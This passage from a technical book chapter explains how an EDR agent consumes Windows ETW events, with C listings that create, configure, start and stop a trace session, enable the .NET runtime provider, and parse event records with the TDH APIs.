<p class="TNI">To begin consuming events, we must first create a trace session using the <samp class="SANS_TheSansMonoCd_W5Regular_11">sechost!StartTrace()</samp> API. This function takes a pointer to an <samp class="SANS_TheSansMonoCd_W5Regular_11">EVENT_TRACE_PROPERTIES</samp> structure, defined in <a href="#list8-6">Listing 8-6</a>. (On systems running versions of Windows later than 1703, the function could choose to take a pointer to an <samp class="SANS_TheSansMonoCd_W5Regular_11">EVENT_TRACE_PROPERTIES_V2</samp> structure instead.)</p>&#13;
<pre id="list8-6"><code><span role="doc-pagebreak" epub:type="pagebreak" id="pg_152" aria-label=" Page 152. "/>typedef struct _EVENT_TRACE_PROPERTIES {&#13;
  WNODE_HEADER Wnode;&#13;
  ULONG        BufferSize;&#13;
  ULONG        MinimumBuffers;&#13;
  ULONG        MaximumBuffers;&#13;
  ULONG        MaximumFileSize;&#13;
  ULONG        LogFileMode;&#13;
  ULONG        FlushTimer;&#13;
  ULONG        EnableFlags;&#13;
  union {&#13;
    LONG AgeLimit;&#13;
    LONG FlushThreshold;&#13;
  } DUMMYUNIONNAME;&#13;
  ULONG        NumberOfBuffers;&#13;
  ULONG        FreeBuffers;&#13;
  ULONG        EventsLost;&#13;
  ULONG        BuffersWritten;&#13;
  ULONG        LogBuffersLost;&#13;
  ULONG        RealTimeBuffersLost;&#13;
  HANDLE LoggerThreadId;&#13;
  ULONG        LogFileNameOffset;&#13;
  ULONG        LoggerNameOffset;&#13;
} EVENT_TRACE_PROPERTIES, *PEVENT_TRACE_PROPERTIES;</code></pre>&#13;
<p class="CodeListingCaption"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 8-6: The <samp class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">EVENT_TRACE_PROPERTIES</samp> structure definition</span></p>&#13;
<p class="TX">This structure describes the trace session. The consumer will populate it and pass it to a function that starts the trace session, as shown in <a href="#list8-7">Listing 8-7</a>.</p>&#13;
<pre id="list8-7"><code>static const GUID g_sessionGuid =&#13;
{0xb09ce00c, 0xbcd9, 0x49eb,&#13;
{0xae, 0xce, 0x42, 0x45, 0x1, 0x2f, 0x97, 0xa9}&#13;
};&#13;
static const WCHAR g_sessionName[] = L"DotNETEventConsumer";&#13;
&#13;
int main()&#13;
{&#13;
    ULONG ulBufferSize =&#13;
        sizeof(EVENT_TRACE_PROPERTIES) + sizeof(g_sessionName);&#13;
    PEVENT_TRACE_PROPERTIES pTraceProperties =&#13;
        (PEVENT_TRACE_PROPERTIES)malloc(ulBufferSize);&#13;
    if (!pTraceProperties)&#13;
    {&#13;
        return ERROR_OUTOFMEMORY;&#13;
    }&#13;
    ZeroMemory(pTraceProperties, ulBufferSize);&#13;
&#13;
    pTraceProperties-&gt;Wnode.BufferSize = ulBufferSize;&#13;
    pTraceProperties-&gt;Wnode.Flags = WNODE_FLAG_TRACED_GUID;&#13;
    pTraceProperties-&gt;Wnode.ClientContext = 1;&#13;
    pTraceProperties-&gt;Wnode.Guid = g_sessionGuid;&#13;
    pTraceProperties-&gt;LogFileMode = EVENT_TRACE_REAL_TIME_MODE;&#13;
    pTraceProperties-&gt;LoggerNameOffset = sizeof(EVENT_TRACE_PROPERTIES);<span role="doc-pagebreak" epub:type="pagebreak" id="pg_153" aria-label=" Page 153. "/>&#13;
&#13;
    wcscpy_s(&#13;
        (PWCHAR)(pTraceProperties + 1),&#13;
        wcslen(g_sessionName) + 1,&#13;
        g_sessionName);&#13;
&#13;
    DWORD dwStatus = 0;&#13;
    TRACEHANDLE hTrace = NULL;&#13;
&#13;
    while (TRUE) {&#13;
        dwStatus = StartTraceW(&#13;
            &amp;hTrace,&#13;
            g_sessionName,&#13;
            pTraceProperties);&#13;
&#13;
        if (dwStatus == ERROR_ALREADY_EXISTS)&#13;
        {&#13;
            dwStatus = ControlTraceW(&#13;
                hTrace,&#13;
                g_sessionName,&#13;
                pTraceProperties,&#13;
                EVENT_TRACE_CONTROL_STOP);&#13;
        }&#13;
    if (dwStatus != ERROR_SUCCESS)&#13;
    {&#13;
            return dwStatus;&#13;
    }&#13;
&#13;
    <var>--snip--</var>&#13;
}</code></pre>&#13;
<p class="CodeListingCaption"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 8-7: Configuring trace properties</span></p>&#13;
<p class="TX">We populate the <samp class="SANS_TheSansMonoCd_W5Regular_11">WNODE_HEADER</samp> structure pointed to in the trace properties. Note that the <samp class="SANS_TheSansMonoCd_W5Regular_11">Guid</samp> member contains the GUID of the trace session, not of the desired provider. Additionally, the <samp class="SANS_TheSansMonoCd_W5Regular_11">LogFileMode</samp> member of the trace properties structure is usually set to <samp class="SANS_TheSansMonoCd_W5Regular_11">EVENT_TRACE_REAL_TIME_MODE</samp> to enable real-time event tracing.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec10">&#13;
<h3 class="H2" id="sec10"><span id="h-114"/><samp class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Enabling Providers</samp></h3>&#13;
<p class="TNI">The trace session isn’t yet collecting events, as no providers have been enabled for it. To add providers, we use the <samp class="SANS_TheSansMonoCd_W5Regular_11">sechost!EnableTraceEx2()</samp> API. This function takes the <samp class="SANS_TheSansMonoCd_W5Regular_11">TRACEHANDLE</samp> returned earlier as a parameter and is defined in <a href="#list8-8">Listing 8-8</a>.</p>&#13;
<pre id="list8-8"><code>ULONG WMIAPI EnableTraceEx2(&#13;
  [in]           TRACEHANDLE               TraceHandle,&#13;
  [in]           LPCGUID                   ProviderId,&#13;
  [in]           ULONG                     ControlCode,&#13;
  [in]           UCHAR                     Level,&#13;
  [in]           ULONGLONG                 MatchAnyKeyword,&#13;
  [in]           ULONGLONG                 MatchAllKeyword,<span role="doc-pagebreak" epub:type="pagebreak" id="pg_154" aria-label=" Page 154. "/>&#13;
  [in]           ULONG                     Timeout,&#13;
  [in, optional] PENABLE_TRACE_PARAMETERS EnableParameters&#13;
);</code></pre>&#13;
<p class="CodeListingCaption"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 8-8: The <samp class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">sechost!EnableTraceEx2()</samp> function definition</span></p>&#13;
<p class="TX">The <samp class="SANS_TheSansMonoCd_W5Regular_11">ProviderId</samp> parameter is the target provider’s GUID, and the <samp class="SANS_TheSansMonoCd_W5Regular_11">Level</samp> parameter determines the severity of the events passed to the consumer. It can range from <samp class="SANS_TheSansMonoCd_W5Regular_11">TRACE_LEVEL_VERBOSE</samp> (<i>5</i>) to <samp class="SANS_TheSansMonoCd_W5Regular_11">TRACE_LEVEL_CRITICAL</samp> (<i>1</i>). The consumer will receive any events whose level is less than or equal to the specified value.</p>&#13;
<p class="TX">The <samp class="SANS_TheSansMonoCd_W5Regular_11">MatchAllKeyword</samp> parameter is a bitmask that allows an event to be written only if the event’s keyword bits match all the bits set in this value (or if the event has no keyword bits set). In most cases, this member is set to zero. The <samp class="SANS_TheSansMonoCd_W5Regular_11">MatchAnyKeyword</samp> parameter is a bitmask that allows an event to be written only if the event’s keyword bits match any of the bits set in this value.</p>&#13;
<p class="TX">The <samp class="SANS_TheSansMonoCd_W5Regular_11">EnableParameters</samp> parameter allows the consumer to receive one or more extended data items in each event, including but not limited to the following:</p>&#13;
<p class="RunInPara"><samp class="SANS_TheSansMonoCd_W7Bold_B_11">EVENT_ENABLE_PROPERTY_PROCESS_START_KEY</samp>   A sequence number that identifies the process, guaranteed to be unique to the current boot session</p>&#13;
<p class="RunInPara"><samp class="SANS_TheSansMonoCd_W7Bold_B_11">EVENT_ENABLE_PROPERTY_SID</samp>   The security identifier of the principal, such as a user of the system, under which the event was emitted</p>&#13;
<p class="RunInPara"><samp class="SANS_TheSansMonoCd_W7Bold_B_11">EVENT_ENABLE_PROPERTY_TS_ID</samp>   The terminal session identifier under which the event was emitted</p>&#13;
<p class="RunInPara"><samp class="SANS_TheSansMonoCd_W7Bold_B_11">EVENT_ENABLE_PROPERTY_STACK_TRACE</samp>   Value that adds a call stack if the event was written using the <samp class="SANS_TheSansMonoCd_W5Regular_11">advapi!EventWrite()</samp> API</p>&#13;
<p class="TX">The <samp class="SANS_TheSansMonoCd_W5Regular_11">sechost!EnableTraceEx2()</samp> API can add any number of providers to a trace session, each with its own filtering configurations. <a href="#list8-9">Listing 8-9</a> continues the code in <a href="#list8-7">Listing 8-7</a> by demonstrating how this API is commonly used.</p>&#13;
<pre id="list8-9"><code><span class="CodeAnnotationHang" aria-label="annotation1">❶</span> static const GUID g_providerGuid =&#13;
{0xe13c0d23, 0xccbc, 0x4e12,&#13;
{0x93, 0x1b, 0xd9, 0xcc, 0x2e, 0xee, 0x27, 0xe4}&#13;
};&#13;
int main()&#13;
{&#13;
    <var>--snip--</var>&#13;
&#13;
    dwStatus = EnableTraceEx2(&#13;
        hTrace,&#13;
        &amp;g_providerGuid,&#13;
        EVENT_CONTROL_CODE_ENABLE_PROVIDER,&#13;
        TRACE_LEVEL_INFORMATION,&#13;
      <span class="CodeAnnotationCode-1" aria-label="annotation2">❷</span> 0x2038,&#13;
        0,&#13;
        INFINITE,&#13;
        NULL);<span role="doc-pagebreak" epub:type="pagebreak" id="pg_155" aria-label=" Page 155. "/>&#13;
&#13;
    if (dwStatus != ERROR_SUCCESS)&#13;
    {&#13;
        goto Cleanup;&#13;
    }&#13;
&#13;
    <var>--snip--</var>&#13;
}</code></pre>&#13;
<p class="CodeListingCaption"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 8-9: Configuring a provider for the trace session</span></p>&#13;
<p class="TX">We add the Microsoft-Windows-DotNETRuntime provider <span class="CodeAnnotation" aria-label="annotation1">❶</span> to the trace session and set <samp class="SANS_TheSansMonoCd_W5Regular_11">MatchAnyKeyword</samp> to use the <samp class="SANS_TheSansMonoCd_W5Regular_11">Interop</samp> (0x2000), <samp class="SANS_TheSansMonoCd_W5Regular_11">NGen</samp> (0x20), <samp class="SANS_TheSansMonoCd_W5Regular_11">Jit</samp> (0x10), and <samp class="SANS_TheSansMonoCd_W5Regular_11">Loader</samp> (0x8) keywords <span class="CodeAnnotation" aria-label="annotation2">❷</span>. These keywords allow us to filter out events that we’re not interested in and collect only those relevant to what we’re trying to monitor.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec11">&#13;
<h3 class="H2" id="sec11"><span id="h-115"/><samp class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Starting the Trace Session</samp></h3>&#13;
<p class="TNI">After we’ve completed all of these preparatory steps, we can start the trace session. To do so, an EDR agent would call <samp class="SANS_TheSansMonoCd_W5Regular_11">sechost!OpenTrace()</samp> with a pointer to an <samp class="SANS_TheSansMonoCd_W5Regular_11">EVENT_TRACE_LOGFILE</samp>, defined in <a href="#list8-10">Listing 8-10</a>, as its only parameter.</p>&#13;
<pre id="list8-10"><code>typedef struct _EVENT_TRACE_LOGFILEW {&#13;
   LPWSTR                        LogFileName;&#13;
   LPWSTR                        LoggerName;&#13;
   LONGLONG                      CurrentTime;&#13;
   ULONG                         BuffersRead;&#13;
   union {&#13;
     ULONG LogFileMode;&#13;
     ULONG ProcessTraceMode;&#13;
   } DUMMYUNIONNAME;&#13;
   EVENT_TRACE                   CurrentEvent;&#13;
   TRACE_LOGFILE_HEADER          LogfileHeader;&#13;
   PEVENT_TRACE_BUFFER_CALLBACKW BufferCallback;&#13;
   ULONG                         BufferSize;&#13;
   ULONG                         Filled;&#13;
   ULONG                         EventsLost;&#13;
   union {&#13;
     PEVENT_CALLBACK        EventCallback;&#13;
     PEVENT_RECORD_CALLBACK EventRecordCallback;&#13;
   } DUMMYUNIONNAME2;&#13;
   ULONG                          IsKernelTrace;&#13;
   PVOID                          Context;&#13;
}  EVENT_TRACE_LOGFILEW, *PEVENT_TRACE_LOGFILEW;</code></pre>&#13;
<p class="CodeListingCaption"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 8-10: The <samp class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">EVENT_TRACE_LOGFILE</samp> structure definition</span></p>&#13;
<p class="TX"><a href="#list8-11">Listing 8-11</a> demonstrates how to use this structure.</p>&#13;
<pre id="list8-11"><code>int main()&#13;
{&#13;
    <var>--snip--</var>&#13;
&#13;
    EVENT_TRACE_LOGFILEW etl = {0};<span role="doc-pagebreak" epub:type="pagebreak" id="pg_156" aria-label=" Page 156. "/>&#13;
 <span class="CodeAnnotationCode" aria-label="annotation1">❶</span> etl.LoggerName = g_sessionName;&#13;
 <span class="CodeAnnotationCode" aria-label="annotation2">❷</span> etl.ProcessTraceMode = PROCESS_TRACE_MODE_EVENT_RECORD |&#13;
                           PROCESS_TRACE_MODE_REAL_TIME;&#13;
 <span class="CodeAnnotationCode" aria-label="annotation3">❸</span> etl.EventRecordCallback = OnEvent;&#13;
&#13;
    TRACEHANDLE hSession = NULL;&#13;
    hSession = OpenTrace(&amp;etl);&#13;
    if (hSession == INVALID_PROCESSTRACE_HANDLE)&#13;
    {&#13;
        goto Cleanup;&#13;
    }&#13;
&#13;
    <var>--snip--</var>&#13;
}</code></pre>&#13;
<p class="CodeListingCaption"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 8-11: Passing the <samp class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">EVENT_TRACE_LOGFILE</samp> structure to <samp class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">sechost!OpenTrace()</samp></span></p>&#13;
<p class="TX">While this is a relatively large structure, only three of the members are immediately relevant to us. The <samp class="SANS_TheSansMonoCd_W5Regular_11">LoggerName</samp> member is the name of the trace session <span class="CodeAnnotation" aria-label="annotation1">❶</span>, and <samp class="SANS_TheSansMonoCd_W5Regular_11">ProcessTraceMode</samp> is a bitmask containing the values for <samp class="SANS_TheSansMonoCd_W5Regular_11">PROCESS_TRACE_MODE_EVENT_RECORD</samp> (0x10000000), to indicate that events should use the <samp class="SANS_TheSansMonoCd_W5Regular_11">EVENT_RECORD</samp> format introduced in Windows Vista, as well as <samp class="SANS_TheSansMonoCd_W5Regular_11">PROCESS_TRACE_MODE_REAL_TIME</samp> (0x100), to indicate that events should be received in real time <span class="CodeAnnotation" aria-label="annotation2">❷</span>. Lastly, <samp class="SANS_TheSansMonoCd_W5Regular_11">EventRecordCallback</samp> is a pointer to the internal callback function <span class="CodeAnnotation" aria-label="annotation3">❸</span> (covered shortly) that ETW calls for each new event, passing it an <samp class="SANS_TheSansMonoCd_W5Regular_11">EVENT_RECORD</samp> structure.</p>&#13;
<p class="TX">When <samp class="SANS_TheSansMonoCd_W5Regular_11">sechost!OpenTrace()</samp> completes, it returns a new <samp class="SANS_TheSansMonoCd_W5Regular_11">TRACEHANDLE</samp> (<samp class="SANS_TheSansMonoCd_W5Regular_11">hSession</samp>, in our example). We can then pass this handle to <samp class="SANS_TheSansMonoCd_W5Regular_11">sechost!ProcessTrace()</samp>, as shown in <a href="#list8-12">Listing 8-12</a>, to start processing events.</p>&#13;
<pre id="list8-12"><code>void ProcessEvents(PTRACEHANDLE phSession)&#13;
{&#13;
    FILETIME now;&#13;
 <span class="CodeAnnotationCode" aria-label="annotation1">❶</span> GetSystemTimeAsFileTime(&amp;now);&#13;
    ProcessTrace(phSession, 1, &amp;now, NULL);&#13;
&#13;
}&#13;
int main()&#13;
{&#13;
    <var>--snip--</var>&#13;
&#13;
    HANDLE hThread = NULL;&#13;
 <span class="CodeAnnotationCode" aria-label="annotation2">❷</span> hThread = CreateThread(&#13;
                  NULL, 0,&#13;
                  ProcessEvents,&#13;
                  &amp;hSession,&#13;
                  0, NULL);&#13;
&#13;
    if (!hThread)&#13;
    {&#13;
        goto Cleanup;&#13;
    }<span role="doc-pagebreak" epub:type="pagebreak" id="pg_157" aria-label=" Page 157. "/>&#13;
&#13;
    <var>--snip--</var>&#13;
}</code></pre>&#13;
<p class="CodeListingCaption"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 8-12: Creating the thread to process events</span></p>&#13;
<p class="TX">We pass the current system time <span class="CodeAnnotation" aria-label="annotation1">❶</span> to <samp class="SANS_TheSansMonoCd_W5Regular_11">sechost!ProcessTrace()</samp> to tell the system that we want to capture events occurring after this time only. When called, this function will take control of the current thread, so to avoid completely blocking the rest of the application, we create a new thread <span class="CodeAnnotation" aria-label="annotation2">❷</span> just for the trace session.</p>&#13;
<p class="TX">Assuming no errors were returned, events should start flowing from the provider to the consumer, where they’ll be processed by the internal callback function specified in the <samp class="SANS_TheSansMonoCd_W5Regular_11">EventRecordCallback</samp> member of the <samp class="SANS_TheSansMonoCd_W5Regular_11">EVENT_TRACE_LOGFILE</samp> structure. We’ll cover this function in <span class="Xref">“Processing Events” on <a href="#sec13">page 158</a></span>.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec12">&#13;
<h3 class="H2" id="sec12"><span id="h-116"/><samp class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Stopping the Trace Session</samp></h3>&#13;
<p class="TNI">Finally, we need a way to stop the trace as needed. One way to do this is to use a global Boolean value that we can flip when we need the trace to stop, but any technique that signals a thread to exit would work. However, if an outside user can invoke the method used (in the case of an unchecked RPC function, for example), a malicious user might be able to stop the agent from collecting events via the trace session altogether. <a href="#list8-13">Listing 8-13</a> shows how stopping the trace might work.</p>&#13;
<pre id="list8-13"><code>HANDLE g_hStop = NULL;&#13;
BOOL ConsoleCtrlHandler(DWORD dwCtrlType)&#13;
&#13;
{&#13;
 <span class="CodeAnnotationCode" aria-label="annotation1">❶</span> if (dwCtrlType == CTRL_C_EVENT) {&#13;
      <span class="CodeAnnotationCode-1" aria-label="annotation2">❷</span> SetEvent(g_hStop);&#13;
        return TRUE;&#13;
    }&#13;
    return FALSE;&#13;
}&#13;
&#13;
int main()&#13;
{&#13;
    <var>--snip--</var>&#13;
&#13;
    g_hStop = CreateEvent(NULL, TRUE, FALSE, NULL);&#13;
    SetConsoleCtrlHandler(ConsoleCtrlHandler, TRUE);&#13;
&#13;
    WaitForSingleObject(g_hStop, INFINITE);&#13;
&#13;
 <span class="CodeAnnotationCode" aria-label="annotation3">❸</span> CloseTrace(hSession);&#13;
    WaitForSingleObject(hThread, INFINITE);&#13;
    CloseHandle(g_hStop);&#13;
    CloseHandle(hThread);<span role="doc-pagebreak" epub:type="pagebreak" id="pg_158" aria-label=" Page 158. "/>&#13;
    return dwStatus&#13;
}</code></pre>&#13;
<p class="CodeListingCaption"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 8-13: Using a console control handler to signal a thread exit</span></p>&#13;
<p class="TX">In this example, we use an internal console control handler routine, <samp class="SANS_TheSansMonoCd_W5Regular_11">ConsoleCtrlHandler()</samp>, and an event object that watches for the <small>CTRL</small>-C keyboard combination <span class="CodeAnnotation" aria-label="annotation1">❶</span>. When the handler observes this keyboard combination, the internal function notifies the <i>event object</i> <span class="CodeAnnotation" aria-label="annotation2">❷</span>, a synchronization object commonly used to tell a thread that some event has occurred, and returns. Because the event object has been signaled, the application resumes its execution and closes the trace session <span class="CodeAnnotation" aria-label="annotation3">❸</span>.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec13">&#13;
<h3 class="H2" id="sec13"><span id="h-117"/><samp class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Processing Events</samp></h3>&#13;
<p class="TNI">When the consumer thread receives a new event, its callback function (<samp class="SANS_TheSansMonoCd_W5Regular_11">OnEvent()</samp> in our example code) is invoked with a pointer to an <samp class="SANS_TheSansMonoCd_W5Regular_11">EVENT_RECORD</samp> structure. This structure, defined in <a href="#list8-14">Listing 8-14</a>, represents the entirety of the event.</p>&#13;
<pre id="list8-14"><code>typedef struct _EVENT_RECORD {&#13;
  EVENT_HEADER                      EventHeader;&#13;
  ETW_BUFFER_CONTEXT                BufferContext;&#13;
  USHORT                            ExtendedDataCount;&#13;
  USHORT                            UserDataLength;&#13;
  PEVENT_HEADER_EXTENDED_DATA_ITEM  ExtendedData;&#13;
  PVOID                             UserData;&#13;
  PVOID                             UserContext;&#13;
} EVENT_RECORD, *PEVENT_RECORD;</code></pre>&#13;
<p class="CodeListingCaption"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 8-14: The <samp class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">EVENT_RECORD</samp> structure definition</span></p>&#13;
<p class="TX">This structure might seem simple at first glance, but it could contain a huge amount of information. The first field, <samp class="SANS_TheSansMonoCd_W5Regular_11">EventHeader</samp>, holds basic event metadata, such as the process ID of the provider binary; a timestamp; and an <samp class="SANS_TheSansMonoCd_W5Regular_11">EVENT_DESCRIPTOR</samp>, which describes the event itself in detail. The <samp class="SANS_TheSansMonoCd_W5Regular_11">ExtendedData</samp> member matches the data passed in the <samp class="SANS_TheSansMonoCd_W5Regular_11">EnableProperty</samp> parameter of <samp class="SANS_TheSansMonoCd_W5Regular_11">sechost!EnableTraceEx2()</samp>. This field is a pointer to an <samp class="SANS_TheSansMonoCd_W5Regular_11">EVENT_HEADER_EXTENDED_DATA_ITEM</samp>, defined in <a href="#list8-15">Listing 8-15</a>.</p>&#13;
<pre id="list8-15"><code>typedef struct _EVENT_HEADER_EXTENDED_DATA_ITEM {&#13;
  USHORT   Reserved1;&#13;
  USHORT   ExtType;&#13;
  struct {&#13;
    USHORT Linkage : 1;&#13;
    USHORT Reserved2 : 15;&#13;
  };&#13;
  USHORT   DataSize;&#13;
  ULONGLONG DataPtr;&#13;
} EVENT_HEADER_EXTENDED_DATA_ITEM, *PEVENT_HEADER_EXTENDED_DATA_ITEM;</code></pre>&#13;
<p class="CodeListingCaption"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 8-15: The <samp class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">EVENT_HEADER_EXTENDED_DATA_ITEM</samp> structure definition</span></p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_159" aria-label=" Page 159. "/>The <samp class="SANS_TheSansMonoCd_W5Regular_11">ExtType</samp> member contains an identifier (defined in <i>eventcons.h</i> and shown in <a href="#list8-16">Listing 8-16</a>) that tells the consumer to which data type the <samp class="SANS_TheSansMonoCd_W5Regular_11">DataPtr</samp> member points. Note that a significant number of values defined in the headers are not formally supported for the callers of the API in Microsoft’s documentation.</p>&#13;
<pre id="list8-16"><code>#define EVENT_HEADER_EXT_TYPE_RELATED_ACTIVITYID   0x0001&#13;
#define EVENT_HEADER_EXT_TYPE_SID                  0x0002&#13;
#define EVENT_HEADER_EXT_TYPE_TS_ID                0x0003&#13;
#define EVENT_HEADER_EXT_TYPE_INSTANCE_INFO        0x0004&#13;
#define EVENT_HEADER_EXT_TYPE_STACK_TRACE32        0x0005&#13;
#define EVENT_HEADER_EXT_TYPE_STACK_TRACE64        0x0006&#13;
#define EVENT_HEADER_EXT_TYPE_PEBS_INDEX           0x0007&#13;
#define EVENT_HEADER_EXT_TYPE_PMC_COUNTERS         0x0008&#13;
#define EVENT_HEADER_EXT_TYPE_PSM_KEY              0x0009&#13;
#define EVENT_HEADER_EXT_TYPE_EVENT_KEY            0x000A&#13;
#define EVENT_HEADER_EXT_TYPE_EVENT_SCHEMA_TL      0x000B&#13;
#define EVENT_HEADER_EXT_TYPE_PROV_TRAITS          0x000C&#13;
#define EVENT_HEADER_EXT_TYPE_PROCESS_START_KEY    0x000D&#13;
#define EVENT_HEADER_EXT_TYPE_CONTROL_GUID         0x000E&#13;
#define EVENT_HEADER_EXT_TYPE_QPC_DELTA            0x000F&#13;
#define EVENT_HEADER_EXT_TYPE_CONTAINER_ID         0x0010&#13;
#define EVENT_HEADER_EXT_TYPE_MAX                  0x0011</code></pre>&#13;
<p class="CodeListingCaption"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 8-16: The <samp class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">EVENT_HEADER_EXT_TYPE</samp> constants</span></p>&#13;
<p class="TX">This <samp class="SANS_TheSansMonoCd_W5Regular_11">ExtendedData</samp> member of the <samp class="SANS_TheSansMonoCd_W5Regular_11">EVENT_RECORD</samp> contains valuable data, but agents typically use it to supplement other sources, particularly the <samp class="SANS_TheSansMonoCd_W5Regular_11">UserData</samp> member of the <samp class="SANS_TheSansMonoCd_W5Regular_11">EVENT_RECORD</samp>. This is where things get a little tricky, as Microsoft states that, in almost all cases, we must retrieve this data using the TDH APIs.</p>&#13;
<p class="TX">We’ll walk through this process in our callback function, but keep in mind that this example represents only one approach to extracting relevant information and may not reflect production code. To begin processing the event data, the agent calls <samp class="SANS_TheSansMonoCd_W5Regular_11">tdh!TdhGetEventInformation()</samp>, as shown in <a href="#list8-17">Listing 8-17</a>.</p>&#13;
<pre id="list8-17"><code>void CALLBACK OnEvent(PEVENT_RECORD pRecord)&#13;
{&#13;
    ULONG ulSize = 0;&#13;
    DWORD dwStatus = 0;&#13;
    PBYTE pUserData = (PBYTE)pRecord-&gt;UserData;&#13;
&#13;
    dwStatus = TdhGetEventInformation(pRecord, 0, NULL, NULL, &amp;ulSize);&#13;
&#13;
    PTRACE_EVENT_INFO pEventInfo = (PTRACE_EVENT_INFO)malloc(ulSize);&#13;
    if (!pEventInfo)&#13;
    {&#13;
        // Exit immediately if we're out of memory&#13;
        ExitProcess(ERROR_OUTOFMEMORY);&#13;
    }&#13;
&#13;
    dwStatus = TdhGetEventInformation(&#13;
        pRecord,<span role="doc-pagebreak" epub:type="pagebreak" id="pg_160" aria-label=" Page 160. "/>&#13;
        0,&#13;
        NULL,&#13;
        pEventInfo,&#13;
        &amp;ulSize);&#13;
    if (dwStatus != ERROR_SUCCESS)&#13;
    {&#13;
        return;&#13;
    }&#13;
&#13;
    <var>--snip--</var>&#13;
}</code></pre>&#13;
<p class="CodeListingCaption"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 8-17: Beginning to process event data</span></p>&#13;
<p class="TX">After allocating memory of the required size, we pass a pointer to a <samp class="SANS_TheSansMonoCd_W5Regular_11">TRACE_EVENT_INFO</samp> structure, as the first parameter to the function. <a href="#list8-18">Listing 8-18</a> defines this structure.</p>&#13;
<pre id="list8-18"><code>typedef struct _TRACE_EVENT_INFO {&#13;
  GUID                ProviderGuid;&#13;
  GUID                EventGuid;&#13;
  EVENT_DESCRIPTOR    EventDescriptor;&#13;
<span class="CodeAnnotationCode-1" aria-label="annotation1">❶</span> DECODING_SOURCE     DecodingSource;&#13;
  ULONG               ProviderNameOffset;&#13;
  ULONG               LevelNameOffset;&#13;
  ULONG               ChannelNameOffset;&#13;
  ULONG               KeywordsNameOffset;&#13;
  ULONG               TaskNameOffset;&#13;
  ULONG               OpcodeNameOffset;&#13;
  ULONG               EventMessageOffset;&#13;
  ULONG               ProviderMessageOffset;&#13;
  ULONG               BinaryXMLOffset;&#13;
  ULONG               BinaryXMLSize;&#13;
  union {&#13;
    ULONG EventNameOffset;&#13;
    ULONG ActivityIDNameOffset;&#13;
  };&#13;
  union {&#13;
    ULONG EventAttributesOffset;&#13;
    ULONG RelatedActivityIDNameOffset;&#13;
};&#13;
  ULONG               PropertyCount;&#13;
  ULONG               TopLevelPropertyCount;&#13;
  union {&#13;
    TEMPLATE_FLAGS Flags;&#13;
    struct {&#13;
      ULONG Reserved : 4;&#13;
      ULONG Tags : 28;&#13;
    };&#13;
  };&#13;
<span class="CodeAnnotationCode-1" aria-label="annotation2">❷</span> EVENT_PROPERTY_INFO EventPropertyInfoArray[ANYSIZE_ARRAY];&#13;
} TRACE_EVENT_INFO;</code></pre>&#13;
<p class="CodeListingCaption"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 8-18: The <samp class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">TRACE_EVENT_INFO</samp> structure definition</span></p>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_161" aria-label=" Page 161. "/>When the function returns, it will populate this structure with useful metadata, such as the <samp class="SANS_TheSansMonoCd_W5Regular_11">DecodingSource</samp> <span class="CodeAnnotation" aria-label="annotation1">❶</span>, used to identify how the event is defined (in an instrumentation manifest, MOF class, or WPP template). But the most important value is <samp class="SANS_TheSansMonoCd_W5Regular_11">EventPropertyInfoArray</samp> <span class="CodeAnnotation" aria-label="annotation2">❷</span>, an array of <samp class="SANS_TheSansMonoCd_W5Regular_11">EVENT_PROPERTY_INFO</samp> structures, defined in <a href="#list8-19">Listing 8-19</a>, that provides information about each property of the <samp class="SANS_TheSansMonoCd_W5Regular_11">EVENT_RECORD</samp>’s <samp class="SANS_TheSansMonoCd_W5Regular_11">UserData</samp> member.</p>&#13;
<pre id="list8-19"><code>typedef struct _EVENT_PROPERTY_INFO {&#13;
<span class="CodeAnnotationCode-1" aria-label="annotation1">❶</span> PROPERTY_FLAGS Flags;&#13;
  ULONG   NameOffset;&#13;
  union {&#13;
    struct {&#13;
      USHORT InType;&#13;
      USHORT OutType;&#13;
      ULONG MapNameOffset;&#13;
    } nonStructType;&#13;
    struct {&#13;
      USHORT StructStartIndex;&#13;
      USHORT NumOfStructMembers;&#13;
      ULONG padding;&#13;
    } structType;&#13;
    struct {&#13;
      USHORT InType;&#13;
      USHORT OutType;&#13;
      ULONG CustomSchemaOffset;&#13;
    } customSchemaType;&#13;
  };&#13;
  union {&#13;
  <span class="CodeAnnotationCode-1" aria-label="annotation2">❷</span> USHORT count;&#13;
    USHORT countPropertyIndex;&#13;
  };&#13;
  union {&#13;
  <span class="CodeAnnotationCode-1" aria-label="annotation3">❸</span> USHORT length;&#13;
    USHORT lengthPropertyIndex;&#13;
  };&#13;
 union {&#13;
    ULONG Reserved;&#13;
    struct {&#13;
      ULONG Tags : 28;&#13;
    };&#13;
  };&#13;
} EVENT_PROPERTY_INFO;</code></pre>&#13;
